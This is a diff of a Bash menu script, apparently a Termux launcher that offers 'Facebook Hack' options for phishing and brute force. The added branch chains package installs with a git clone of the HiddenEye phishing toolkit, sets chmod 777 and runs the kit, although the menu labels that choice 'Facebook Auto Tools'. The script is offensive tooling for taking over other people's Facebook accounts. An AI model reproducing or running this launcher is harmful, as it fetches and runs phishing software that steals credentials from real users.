@@ -35,11 +35,11 @@ toilet -f pagga "BANGLADESH" | lolcat
 echo
 echo
 echo
-echo $ku"★"$i"##########################################"$ku"★"
-echo $ku"★"$cy"   |"$me"1"$cy"|"$pur"  Facebook Auto Tools"$ku"               ★"
-echo $ku"★"$cy"   |"$me"2"$cy"|"$pur"  Facebook Hack [Phishing]"$ku"          ★"
-echo $ku"★"$cy"   |"$me"3"$cy"|"$pur"  Facebook Hack [BruteForse]"$ku"        ★"
-echo $ku"★"$i"##########################################"$ku"★"
+      echo $ku"★"$i"##########################################"$ku"★"
+      echo $ku"★"$cy"   |"$me"1"$cy"|"$pur"  Facebook Auto Tools"$ku"               ★"
+      echo $ku"★"$cy"   |"$me"2"$cy"|"$pur"  Facebook Hack [Phishing]"$ku"          ★"
+      echo $ku"★"$cy"   |"$me"3"$cy"|"$pur"  Facebook Hack [BruteForse]"$ku"        ★"
+      echo $ku"★"$i"##########################################"$ku"★"
 echo
 echo $me"┌==="$bi"["$i"BD"$bi"]"$me"======"$bi"["$i""Pilih Nomornya""$bi"]"
 echo $me"¦"
@@ -57,7 +57,12 @@ pip2 install -r requirements.txt
 python2 osif.py
 fi
 
-
-
+if [ $pil = 1 ]
+then
+clear
+toilet -f pagga "W A I T" | lolcat
+sleep 1
+pkg install git python php curl openssh grep && git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git && chmod 777 HiddenEye && cd HiddenEye && pip install -r requirements.txt && pip install requests && python HiddenEye.py 
+fi
 
 
